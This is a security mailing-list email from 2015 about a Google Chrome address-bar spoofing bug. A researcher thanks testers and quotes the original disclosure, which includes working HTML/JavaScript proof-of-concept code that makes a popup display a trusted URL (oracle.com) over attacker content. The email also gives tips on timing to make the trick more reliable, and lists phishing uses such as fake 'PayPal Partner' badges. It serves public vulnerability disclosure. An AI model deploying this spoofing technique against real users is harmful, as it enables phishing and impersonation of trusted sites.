X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3371" "Wednesday" "1" "July" "2015" "14:39:14" "+0100" "David Leo" "david.leo@deusen.co.uk" "<5593ED82.6000806@deusen.co.uk>" "121" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" nil nil nil "7" "2015070113:39:14" "[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)" (number mark "U       david.leo@de Jul  1  121/3371  " thread-indent "\"[oss-security] Re: Google Chrome Address Spoofing (Request For Comment)\"\n") "<55923253.8020902@deusen.co.uk>" ("<55923253.8020902@deusen.co.uk>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13650 invoked by uid 550); 1 Jul 2015 14:07:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17791 invoked from network); 1 Jul 2015 13:39:34 -0000
Message-ID: <5593ED82.6000806@deusen.co.uk>
Date: Wed, 01 Jul 2015 14:39:14 +0100
From: David Leo <david.leo@deusen.co.uk>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Thunderbird/31.1.1
MIME-Version: 1.0
To: bugtraq@securityfocus.com, fulldisclosure@seclists.org, 
 oss-security@lists.openwall.com
References: <55923253.8020902@deusen.co.uk>
In-Reply-To: <55923253.8020902@deusen.co.uk>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: [oss-security] Re: Google Chrome Address Spoofing (Request For Comment)

http://seclists.org/fulldisclosure/2015/Jun/109
Big Whale said:
"Tested on Google Chrome 43.0.2357.130 (64-bit) (Linux) and it works"
"clearly URL spoofing"
Thanks for testing!

http://seclists.org/oss-sec/2015/q3/0
0pc0deFR said:
"Work on Google Chrome Ubuntu"
Bonjour, thanks for testing!

http://seclists.org/oss-sec/2015/q2/824
Daniel Micay said:
"It does display a window with the oracle.com address"
"why you've got an ever increasing number of setTimeout events"
http://seclists.org/oss-sec/2015/q2/823
Alexander E. Patrakov said:
"Looks like a fork bomb"
Thanks for testing!
The number of "setTimeout" does NOT need to be increasing forever.
OK, I admit - we are lazy(it works and we don't touch it anymore)
:-)

http://seclists.org/oss-sec/2015/q3/2
Roney Gomes said:
"it worked on the desktop version of Opera"
Wow! Thanks for letting us know.
Here is the screenshot of Opera
http://www.deusen.co.uk/items/gwhere.6128645971389012/OperaScreenshot.png
And Chrome
http://www.deusen.co.uk/items/gwhere.6128645971389012/ChromeScreenshot.png
(A number is displayed in Chrome's address bar,
not the same as Opera)

http://seclists.org/oss-sec/2015/q2/826
Daniel Micay said:
"it can't always be replicated"
"I've tried it a few times and"
"it fails about as often as it works"
http://seclists.org/oss-sec/2015/q3/4
Valentinas Bakaitis said:
"PoC did not work"
Hey! The trick here is timing:
Please modify those numbers in code - make them smaller.

http://seclists.org/oss-sec/2015/q3/5
Zak Siddiqui said:
"Is it reproducible with HTTPS?"
Yes, we just tried this URL
https://en.wikipedia.org/wiki/Main_Page
It works.
In fact, it works BETTER against HTTPS,
because HTTPS is slower, so timing is easier.

http://seclists.org/oss-sec/2015/q2/825
Florian Weimer said:
"they show the new URL while still displaying old content"
Exactly, that's the cause of this bug.

In the end, allow me to repeat:
No user interaction on the fake page.
But, anyone can do
"BBB Accredited Business"
"PayPal Partner"
etc.

Kind Regards,

PS
We love clever tricks.
We love this:
http://dieyu.org/

On 2015/6/30 7:08, David Leo wrote:
> Impact:
> The "click to verify" thing is completely broken...
> Anyone can be "BBB Accredited Business" etc.
> You can make whitehouse.gov display "We love Islamic State" :-)
>
> Note:
> No user interaction on the fake page.
>
> Code:
> ***** index.html
> <script>
> function next()
> {
>      w.location.replace('http://www.oracle.com/index.html?'+n);n++;
>      setTimeout("next();",15);
>      setTimeout("next();",25);
> }
> function f()
> {
>      w=window.open("content.html","_blank","width=500 height=500");
>      i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
> }
> </script>
> <a href="#" onclick="f()">Go</a><br>
> ***** content.html
> <b>This web page is NOT oracle.com</b>
> <script>location="http://www.oracle.com/index.html";</script>
> ***** It's online
> http://www.deusen.co.uk/items/gwhere.6128645971389012/
> (The page says "June/16/2015" - it works as we tested today)
>
> Request For Comment:
> We reported this to Google.
> They reproduced, and say
> It's DoS which doesn't matter.
> We think it's very strange,
> since the browser does not crash(not DoS),
> and the threat is obvious.
> What's your opinion?
>
> Kind Regards,
>
> PS
> We love clever tricks.
> We love this:
> http://dieyu.org/

